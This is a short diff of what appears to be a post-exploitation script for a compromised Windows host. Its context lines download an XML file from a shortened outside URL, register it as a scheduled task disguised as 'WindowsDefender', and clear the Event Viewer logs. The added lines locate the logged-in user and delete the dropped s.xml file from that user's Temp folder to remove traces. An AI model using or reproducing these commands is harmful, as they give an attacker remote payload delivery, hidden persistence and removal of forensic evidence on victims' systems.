@@ -14,6 +14,10 @@ powershell_execute "$user = (Get-WmiObject -Class Win32_Process -Filter 'Name = 
 
 powershell_execute "$drive = $pwd.Drive.Name; $path = $drive + ':\\Windows\\s.xml'; $client = New-Object System.Net.WebClient; $client.DownloadFile('http://bit.ly/2ksqxok', $path); sleep 3; schtasks /create /XML $path /tn WindowsDefender /f; sleep 2; rm $path"
 
+# Remove "s.xml" from Temp Directory
+
+powershell_execute "$user = (Get-WmiObject -Class Win32_Process -Filter 'Name = \"explorer.exe\"' | ForEach-Object { $_.GetOwner().user }); $drive = $pwd.Drive.Name; $path = ($drive + \":\\Users\\$user\\AppData\\Local\\Temp\\s.xml\"); rm \"$path\""
+
 # Clear Event Viewer Logs
 
 clearev
